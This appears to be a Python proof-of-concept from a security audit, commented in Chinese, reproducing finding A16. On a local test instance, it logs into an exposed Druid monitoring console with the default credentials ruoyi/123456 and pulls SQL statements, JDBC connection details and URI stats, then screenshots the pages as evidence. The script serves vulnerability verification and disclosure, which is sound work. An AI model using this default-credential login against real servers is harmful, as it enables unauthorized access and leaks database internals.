#!/usr/bin/env python3
# A16 复现脚本：Druid 监控台在业务端口暴露且随源码发布的默认凭据可登录，
# 登录后 sql.json/datasource.json/weburi.json 泄露全量 SQL 语句与 JDBC 连接串。
# 用法: /home/irons/dev/tcms/venv/bin/python repro_A16.py
import http.cookiejar
import json
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

BASE = "http://127.0.0.1:8080"
OUT = Path(__file__).resolve().parent


def shot(page, name):
    page.screenshot(path=str(OUT / name), full_page=False)
    print("shot:", name)


def main():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    def fetch(path, data=None):
        req = urllib.request.Request(
            BASE + path,
            data=urllib.parse.urlencode(data).encode() if data is not None else None)
        try:
            with op.open(req, timeout=15) as r:
                return r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")

    evidence = {}

    # 1) 未登录访问：监控台登录页直接可达（SecurityConfig /druid/** permitAll）
    h, _ = fetch("/druid/index.html")
    evidence["index_unauth_http"] = h  # 302 -> login.html（Druid 自带登录门）
    h, body = fetch("/druid/login.html")
    evidence["login_page_http"] = h
    evidence["login_page_has_form"] = "loginUsername" in body

    # 2) 默认凭据登录（application-druid.yml 随源码发布 ruoyi/123456）
    h, body = fetch("/druid/submitLogin",
                    {"loginUsername": "ruoyi", "loginPassword": "123456"})
    evidence["submitLogin"] = {"http": h, "body": body.strip()}

    # 3) 登录后信息泄露面
    h, body = fetch("/druid/sql.json")
    d = json.loads(body)
    rows = d.get("Content") or []
    evidence["sql_json"] = {
        "http": h, "entries": len(rows), "bytes": len(body),
        "sample": [r.get("SQL", "").split("\n")[0][:80] for r in rows[:3]],
    }
    h, body = fetch("/druid/datasource.json")
    d = json.loads(body)
    ds = (d.get("Content") or [{}])[0]
    evidence["datasource_json"] = {
        "http": h,
        "url": ds.get("URL"), "dbType": ds.get("DbType"),
        "driver": ds.get("DriverClassName"),
    }
    h, body = fetch("/druid/weburi.json")
    d = json.loads(body)
    evidence["weburi_json"] = {"http": h, "uri_entries": len(d.get("Content") or [])}

    # 4) 界面实拍：登录页 + SQL 监控页（浏览器走一遍同样路径）
    from playwright.sync_api import sync_playwright
    with sync_playwright() as pw:
        b = pw.chromium.launch(headless=True)
        pg = b.new_page(viewport={"width": 1440, "height": 900})
        pg.goto(BASE + "/druid/login.html", wait_until="networkidle")
        shot(pg, "a16_1_druid_login_page.png")
        pg.fill('input[name="loginUsername"]', "ruoyi")
        pg.fill('input[name="loginPassword"]', "123456")
        pg.locator("#loginBtn").click()
        pg.wait_for_url("**/druid/index.html**", timeout=15000)
        pg.goto(BASE + "/druid/sql.html", wait_until="networkidle")
        pg.wait_for_timeout(2500)
        shot(pg, "a16_2_druid_sql_monitor.png")
        b.close()

    with open(OUT / "a16_evidence.json", "w", encoding="utf-8") as f:
        json.dump(evidence, f, ensure_ascii=False, indent=2)
    print("== evidence ==")
    print(json.dumps(evidence, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
